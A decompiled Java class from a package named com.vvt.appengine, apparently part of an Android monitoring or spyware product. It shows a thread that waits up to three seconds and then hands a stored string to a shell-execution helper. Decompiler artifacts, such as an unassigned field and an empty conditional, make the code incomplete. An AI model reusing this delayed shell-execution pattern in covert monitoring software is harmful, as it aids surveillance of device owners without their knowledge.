package com.vvt.appengine;

import android.os.SystemClock;
import com.vvt.shell.ShellUtil;

class w
  extends Thread
{
  w(v paramv, String paramString1, String paramString2)
  {
    super(paramString1);
  }
  
  public void run()
  {
    int i = 0;
    for (;;)
    {
      int j = 3;
      if (i >= j) {
        break;
      }
      long l = 1000L;
      SystemClock.sleep(l);
      boolean bool = v.a();
      if (bool) {}
      i += 1;
    }
    ShellUtil.h(this.a);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/w.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */